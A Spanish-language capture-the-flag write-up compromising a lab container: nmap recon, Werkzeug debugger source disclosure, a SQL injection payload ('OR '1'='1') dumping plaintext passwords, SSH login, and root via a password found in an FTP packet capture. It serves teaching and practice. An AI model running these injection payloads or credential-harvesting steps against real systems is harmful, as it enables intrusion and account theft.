
## 1. Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```

Puertos abiertos:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian |
| 5000 | HTTP | Werkzeug 1.0.1 / Python 3.9.2 |

---

## 2. Enumeración de la API

```bash
curl http://172.17.0.2:5000
```

```json
{
  "message": "No endpoint selected. Please use /add to add a user or /users to query users."
}
```

La aplicación expone dos endpoints: `/add` para crear usuarios y `/users` para consultarlos.

```bash
curl http://172.17.0.2:5000/users
```

```json
{"error": "Invalid parameter"}
```

El endpoint `/users` requiere un parámetro. Se prueba con `username`:

```bash
curl "http://172.17.0.2:5000/users?username=test"
```

Devuelve lista vacía — el parámetro correcto es `username`.

---

## 3. Information disclosure — código fuente vía Werkzeug debugger

Se prueba `/add` con JSON, que es el formato más habitual en APIs:

```bash
curl -s -X POST http://172.17.0.2:5000/add \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'
```

En lugar de un error limpio, la respuesta es la página completa del debugger de Werkzeug, incluyendo el traceback con el código fuente de la aplicación:

```python
# /home/app.py, línea 20
username = request.form['username']
password = request.form['password']

conn = sqlite3.connect('users.db')
c = conn.cursor()
```

Dos hallazgos críticos:

1. La aplicación usa `request.form`, no `request.json` — espera `application/x-www-form-urlencoded`, no JSON.
2. Las variables `username` y `password` se insertan directamente en una query SQLite sin ningún tipo de sanitización ni uso de parámetros preparados.

El debugger de Werkzeug está diseñado exclusivamente para desarrollo local. Activarlo en producción con acceso desde la red equivale a publicar el código fuente de la aplicación — y en este caso también un SECRET criptográfico que aparece en el JavaScript de la página de error.

---

## 4. Creación de usuario — confirmación del endpoint

Con el formato correcto:

```bash
curl -s -X POST http://172.17.0.2:5000/add \
  -d 'username=test&password=test'
```

```json
{"message": "User added"}
```

Consulta del usuario recién creado:

```bash
curl -s "http://172.17.0.2:5000/users?username=test"
```

```json
[[3, "test", "test"]]
```

La respuesta devuelve los tres campos de la fila: ID, username y password en texto plano. Las contraseñas no están hasheadas.

---

## 5. SQL Injection — volcado de credenciales

El parámetro `username` se inserta directamente en la query sin sanitizar. La condición `OR '1'='1'` siempre es verdadera, lo que hace que la query devuelva todas las filas de la tabla en lugar de filtrar por usuario:

```bash
curl -s "http://172.17.0.2:5000/users?username=test'%20OR%20'1'='1"
```

```json
[
  [1, "pingu", "your_password"],
  [2, "pingu", "pinguinasio"],
  [3, "test", "test"]
]
```

La base de datos contiene dos entradas para `pingu`. La primera tiene `your_password` como valor literal — probablemente el placeholder original del creador de la máquina. La segunda contiene la contraseña real: `pinguinasio`.

---

## 6. Acceso SSH como pingu

```bash
ssh pingu@172.17.0.2
# contraseña: pinguinasio

pingu@a1686fcd64e6:~$ whoami
pingu
```

---

## 7. Escalada a root — credenciales en captura de red

Enumeración básica del sistema:

```bash
sudo -l
# -bash: sudo: command not found

find / -perm -4000 2>/dev/null
# Binarios SUID estándar, nada aprovechable
```

Se revisa el contenido del directorio `/home`:

```bash
ls /home
# app.py  network.pcap  pingu  users.db
```

Hay un archivo `network.pcap` — una captura de tráfico de red. Al leerlo directamente con `cat` se puede ver el contenido en texto plano porque el protocolo capturado (FTP) no cifra las comunicaciones:

```bash
cat /home/network.pcap
```

Entre los bytes del encabezado PCAP aparecen en texto claro los comandos FTP:

```
LOGIN root
PASS balulero
Access Denied
```

El tráfico capturado muestra un intento de login FTP al usuario `root` con la contraseña `balulero`. Aunque el login FTP falló (Access Denied), la contraseña es la del usuario root del sistema.

```bash
su root
# contraseña: balulero

root@a1686fcd64e6:/home# id
uid=0(root) gid=0(root) groups=0(root)
```
